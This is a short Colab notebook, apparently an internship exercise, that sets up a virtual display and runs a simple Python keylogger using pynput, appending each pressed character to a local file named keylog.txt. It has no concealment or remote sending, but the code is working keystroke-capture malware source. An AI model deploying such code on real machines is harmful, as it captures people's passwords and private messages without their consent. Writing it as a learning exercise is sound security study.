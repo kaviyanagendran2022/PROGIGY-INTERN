{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "yIqZNWXrPCNl",
        "outputId": "1b9e7a4d-847d-4fd0-f9b3-32d5cf554e37"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "xvfb is already the newest version (2:21.1.4-2ubuntu1.7~22.04.11).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 49 not upgraded.\n",
            "Requirement already satisfied: pyvirtualdisplay in /usr/local/lib/python3.10/dist-packages (3.0)\n",
            "Requirement already satisfied: pynput in /usr/local/lib/python3.10/dist-packages (1.7.7)\n",
            "Requirement already satisfied: six in /usr/local/lib/python3.10/dist-packages (from pynput) (1.16.0)\n",
            "Requirement already satisfied: evdev>=1.3 in /usr/local/lib/python3.10/dist-packages (from pynput) (1.7.1)\n",
            "Requirement already satisfied: python-xlib>=0.17 in /usr/local/lib/python3.10/dist-packages (from pynput) (0.33)\n"
          ]
        }
      ],
      "source": [
        "!apt-get install xvfb  # Install Xvfb if you haven't already\n",
        "!pip install pyvirtualdisplay # Install pyvirtualdisplay to manage virtual displays\n",
        "!pip install pynput # Install the pynput module\n",
        "\n",
        "from pyvirtualdisplay import Display\n",
        "import os # Import the 'os' module to interact with environment variables\n",
        "# Create a virtual display\n",
        "display = Display(visible=0, size=(800, 600))\n",
        "display.start()\n",
        "\n",
        "# Set the DISPLAY environment variable to point to the virtual display\n",
        "os.environ['DISPLAY'] = ':' + str(display.display) # This line is crucial for pynput to find the display\n",
        "\n",
        "from pynput import keyboard # Import pynput.keyboard after setting the display variable\n",
        "import time\n",
        "\n",
        "\n",
        "def keyPressed(key):\n",
        "    print(str(key))\n",
        "    with open(\"keylog.txt\", 'a') as logkey:\n",
        "        try:\n",
        "           char = key.char\n",
        "           logkey.write(char)\n",
        "        except:\n",
        "            print(\"Error getting char\")\n",
        "\n",
        "if __name__==\"__main__\":\n",
        "    listener = keyboard.Listener(on_press=keyPressed)\n",
        "    listener.start()\n",
        "    input()  # Keep the script running until you press Enter\n",
        "\n",
        "# Stop the virtual display when done\n",
        "display.stop()"
      ]
    }
  ]
}